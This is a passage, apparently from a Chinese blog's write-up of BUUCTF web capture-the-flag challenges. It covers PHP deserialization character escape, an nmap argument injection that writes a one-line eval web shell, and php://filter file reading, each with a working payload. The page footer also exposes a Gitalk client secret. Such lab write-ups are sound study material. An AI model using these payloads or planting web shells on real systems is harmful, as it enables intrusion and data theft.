style="color:#a6e22e">profile</span>;	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update_profile</span>($username, $new_profile) {		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);		$new_profile <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($new_profile);		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">update</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, <span style="color:#e6db74">&#39;profile&#39;</span>, $new_profile, $where);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __tostring() {		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">__class__</span>;	}}<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">mysql</span> {	<span style="color:#66d9ef">private</span> $link <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connect</span>($config) {		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">link</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>(			$config[<span style="color:#e6db74">&#39;hostname&#39;</span>],			$config[<span style="color:#e6db74">&#39;username&#39;</span>], 			$config[<span style="color:#e6db74">&#39;password&#39;</span>]		);		<span style="color:#a6e22e">mysql_select_db</span>($config[<span style="color:#e6db74">&#39;database&#39;</span>]);		<span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SET sql_mode=&#39;strict_all_tables&#39;&#34;</span>);		<span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">link</span>;	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">select</span>($table, $where, $ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*&#39;</span>) {		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT </span><span style="color:#e6db74">$ret</span><span style="color:#e6db74"> FROM </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> WHERE </span><span style="color:#e6db74">$where</span><span style="color:#e6db74">&#34;</span>;		$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">link</span>);		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mysql_fetch_object</span>($result);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">insert</span>($table, $key_list, $value_list) {		$key <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $key_list);		$value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;\&#39;,\&#39;&#39;</span>, $value_list) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span>; 		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$key</span><span style="color:#e6db74">) VALUES (</span><span style="color:#e6db74">$value</span><span style="color:#e6db74">)&#34;</span>;		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mysql_query</span>($sql);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update</span>($table, $key, $value, $where) {		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;UPDATE </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> SET </span><span style="color:#e6db74">$key</span><span style="color:#e6db74"> = &#39;</span><span style="color:#e6db74">$value</span><span style="color:#e6db74">&#39; WHERE </span><span style="color:#e6db74">$where</span><span style="color:#e6db74">&#34;</span>;		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mysql_query</span>($sql);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filter</span>($string) {		$escape <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;\&#39;&#39;</span>, <span style="color:#e6db74">&#39;\\\\&#39;</span>);		$escape <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, $escape) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span>;		$string <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>($escape, <span style="color:#e6db74">&#39;_&#39;</span>, $string);		$safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;insert&#39;</span>, <span style="color:#e6db74">&#39;update&#39;</span>, <span style="color:#e6db74">&#39;delete&#39;</span>, <span style="color:#e6db74">&#39;where&#39;</span>);		$safe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, $safe) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/i&#39;</span>;		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_replace</span>($safe, <span style="color:#e6db74">&#39;hacker&#39;</span>, $string);	}	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __tostring() {		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">__class__</span>;	}}<span style="color:#a6e22e">session_start</span>();$user <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">user</span>();$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">connect</span>($config);
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Login First&#39;</span>);		}	<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;phone&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_FILES[<span style="color:#e6db74">&#39;photo&#39;</span>]) {		$username <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>];		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^\d{11}$/&#39;</span>, $_POST[<span style="color:#e6db74">&#39;phone&#39;</span>]))			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid phone&#39;</span>);		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&#39;</span>, $_POST[<span style="color:#e6db74">&#39;email&#39;</span>]))			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid email&#39;</span>);				<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[^a-zA-Z0-9_]/&#39;</span>, $_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>)			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid nickname&#39;</span>);		$file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;photo&#39;</span>];		<span style="color:#66d9ef">if</span>($file[<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span> <span style="color:#66d9ef">or</span> $file[<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000000</span>)			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Photo size error&#39;</span>);		<span style="color:#a6e22e">move_uploaded_file</span>($file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#39;upload/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($file[<span style="color:#e6db74">&#39;name&#39;</span>]));		$profile[<span style="color:#e6db74">&#39;phone&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;phone&#39;</span>];		$profile[<span style="color:#e6db74">&#39;email&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>];		$profile[<span style="color:#e6db74">&#39;nickname&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>];		$profile[<span style="color:#e6db74">&#39;photo&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;upload/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($file[<span style="color:#e6db74">&#39;name&#39;</span>]);		$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">update_profile</span>($username, <span style="color:#a6e22e">serialize</span>($profile));		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Update Profile Success!&lt;a href=&#34;profile.php&#34;&gt;Your Profile&lt;/a&gt;&#39;</span>;	}	<span style="color:#66d9ef">else</span> {<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>先关注一下photo，上传时检查了一下size，这点不难搞定；之后会将文件保存到 <em>upload</em> 下，而且文件名还会被改，这就比较麻烦了，没办法直接使用。
+除此之外还有个config和register比较简单。
+那就稍微捋一下，首先肯定是有注册一个账号，然后登录，登录之后会跳转到一个修改信息的页面，我们的注入操作主要就是在这个页面进行。观察 update.php 的源码不难发现，在经过一定的过滤之后，会将我们的内容保存在 profile 中，然后会将其反序列化，调用 user 类的 update_profile 方法，这个方法的内容是会中再次进行过滤，之后会将内容保存在数据库中。
+再然后，需要到 profile.php，这个文件会调用首先调用 show_profile 方法，从数据库中读取 profile，然会对其反序列化并使用部分信息。
+这里参考其他师傅的 WP 知道是要利用 PHP 反序列化字符逃逸这样一个知识点。这个我专门学习了一下，可以参考我这一篇<a href="">PHP反序列化字符逃逸</a>文章。
+然后回到这个题，注意mysql类中的filter方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">		$safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;select&#39;</span>, <span style="color:#e6db74">&#39;insert&#39;</span>, <span style="color:#e6db74">&#39;update&#39;</span>, <span style="color:#e6db74">&#39;delete&#39;</span>, <span style="color:#e6db74">&#39;where&#39;</span>);		$safe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;|&#39;</span>, $safe) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/i&#39;</span>;        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_replace</span>($safe, <span style="color:#e6db74">&#39;hacker&#39;</span>, $string);
+</code></pre></div><p>它会将这些关键字替换为hacker，注意到where是5个字母而hacker是6个，那么一旦where被替换就会造成字符逃逸。注意到 config.php 中有flag，那么我们最终需要逃逸出一个 <code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php</code> 这样一个字符串。这里一共30个字符，所以需要30个where。
+于是构造payload就是：<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php</code>
+nickname等于该值即可逃逸出字符串，使得反序列化时得到 config.php 的内容。
+接下来就是绕过 nickname 长度的显示，这个可以通过数组来解决。
+此时，由于nickname被处理为了数组，因此我们逃逸时也需要做修改，最终构造的payload为：
+<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php</code>
+其他正常传输不用改即可。在返回的源码中可以找到base64 的config.php 文件，解码即可获得 flag。</p>
+<h2 id="online-tool">Online Tool</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">phpif</span> (<span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {    $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>];}<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;host&#39;</span>])) {    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);} <span style="color:#66d9ef">else</span> {    $host <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;host&#39;</span>];    $host <span style="color:#f92672">=</span> <span style="color:#a6e22e">escapeshellarg</span>($host);    $host <span style="color:#f92672">=</span> <span style="color:#a6e22e">escapeshellcmd</span>($host);    $sandbox <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;glzjin&#34;</span><span style="color:#f92672">.</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;you are in sandbox &#39;</span><span style="color:#f92672">.</span>$sandbox;    <span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($sandbox);    <span style="color:#a6e22e">chdir</span>($sandbox);    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span style="color:#f92672">.</span>$host);}
+</code></pre></div><p>显示一个 XFF，但是没有什么用，只是用来创建一个文件目录，可以先放一边。
+注意到这里有 escapeshellarg() 和 escapeshellcmd() 对输入进行过滤，猜测到可能是要使用参数注入，而下面是执行 namp 命令，看一下 nmap 的参数：</p>
+<blockquote>
+<p>OUTPUT:
+-oN/-oX/-oS/-oG <!-- raw HTML omitted -->: Output scan in normal, XML, s|&lt;rIpt kIddi3,
+and Grepable format, respectively, to the given filename.
+-oA <!-- raw HTML omitted -->: Output in the three major formats at once
+-v: Increase verbosity level (use -vv or more for greater effect)
+-d: Increase debugging level (use -dd or more for greater effect)
+&ndash;reason: Display the reason a port is in a particular state
+&ndash;open: Only show open (or possibly open) ports
+&ndash;packet-trace: Show all packets sent and received
+&ndash;iflist: Print host interfaces and routes (for debugging)
+&ndash;log-errors: Log errors/warnings to the normal-format output file
+&ndash;append-output: Append to rather than clobber specified output files
+&ndash;resume <!-- raw HTML omitted -->: Resume an aborted scan
+&ndash;stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
+&ndash;webxml: Reference stylesheet from Nmap.Org for more portable XML
+&ndash;no-stylesheet: Prevent associating of XSL stylesheet w/XML output</p>
+</blockquote>
+<p>注意到这里是有一些参数可以写入文件的，于是可以考虑将一句话木马写入指定 php 文件，然后访问这个文件。因此构造payload：
+<code>?host=' &lt;?php @eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php '</code></p>
+<h2 id="include">Include</h2>
+<p>进入之后点击tip可以跳转到 flag.php，看到 URL 就想到直接使用 php伪协议：
+<code>?file=php://filter/convert.base64-encode/resource=flag.php</code>；
+返回内容解码就可以得到flag。</p>
+
+            </div>
+        </div>
+        <div class="w-200">
+            <div id="gitalk"></div>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '9a04c6b451fbce76511d',
+        clientSecret: '430c540c77ecd6b59749c60f0341c057bd5320a0',
+        repo: 'Causa1ity.github.io',
+        owner: 'Causa1ity',
+        admin: 'Causa1ity',
+        id: 'https:\/\/causality.top\/security\/writeups\/buu-web-1\/',
+        distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk')
+</script>
+        </div>
+    </div>
+</div>
+<script>
+    CodeLine.initOnPageLoad({
+        copyBtn: {show: true, position: 'top'},
+        toggleBtn: {show: false}
+    })
+</script>
+<div class="text-center my-8">
+    <span class="font-serif text-lg">
+        Powered By <a href="https://gohugo.io/" class="font-bold hover:text-blue-400">Hugo</a>
+        with theme <a href="https://github.com/causa1ity/hugo-theme-noth/" class="font-bold hover:text-blue-400">Noth</a>
+    </span>
+</div></body>
+</html>
